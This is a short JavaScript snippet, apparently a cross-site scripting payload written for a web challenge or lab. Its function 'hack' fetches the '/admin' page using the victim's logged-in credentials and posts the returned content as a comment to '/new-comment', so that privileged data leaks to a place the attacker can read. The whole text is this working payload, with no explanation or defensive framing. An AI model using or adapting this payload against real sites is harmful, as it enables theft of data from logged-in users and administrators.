async function hack() {
const admin = await (await fetch("/admin", {credentials: "include"})).text();
const test = new URLSearchParams();
test.set("name","Name1123");
test.set("comment",admin);
fetch("/new-comment",{method:"post", body:test});
}

hack();
